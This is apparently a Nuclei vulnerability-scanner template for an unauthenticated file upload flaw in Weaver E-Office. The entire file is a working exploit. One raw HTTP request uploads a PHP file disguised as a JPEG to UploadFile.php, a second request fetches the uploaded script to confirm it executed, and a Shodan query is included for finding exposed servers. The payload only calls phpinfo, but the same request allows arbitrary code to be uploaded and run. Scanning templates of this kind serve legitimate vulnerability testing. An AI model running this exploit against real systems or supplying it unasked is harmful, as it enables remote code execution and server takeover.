id: Weaver_E-Office_uploadfile_php_file_upload

info:
  name: Weaver_E-Office_uploadfile_php_file_upload
  author: HK
  severity: high
  description: Weaver E-Office uploadfile.php file upload
  metadata:
    max-request: 2
    shodan-query: body="/newplugins/js/pnotify/jquery.pnotify.default.css"
    verified: true

http:
  - raw:
      - |-
        @timeout: 30s
        POST /general/index/UploadFile.php?m=uploadPicture&uploadType=eoffice_logo&userId= HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36
        Accept-Encoding: gzip, deflate
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
        Connection: close
        Accept-Language: zh-CN,zh-TW;q=0.9,zh;q=0.8,en-US;q=0.7,en;q=0.6
        Content-Type: multipart/form-data; boundary=e64bdf16c554bbc109cecef6451c26a4
        Content-Length: 192

        --e64bdf16c554bbc109cecef6451c26a4
        Content-Disposition: form-data; name="Filedata"; filename="test.php"
        Content-Type: image/jpeg

        <?php phpinfo();?>

        --e64bdf16c554bbc109cecef6451c26a4--
      - |+
        @timeout: 30s
        GET /images/logo/logo-eoffice.php HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36
        Accept-Encoding: gzip, deflate
        Pragma: no-cache
        Cache-Control: no-cache
        Accept-Language: zh-CN,zh;q=0.9
        Upgrade-Insecure-Requests: 1
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7

    max-redirects: 3
    cookie-reuse: true
    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - logo-eoffice.php
        condition: and
      - type: word
        part: body
        words:
          - php.ini
        condition: and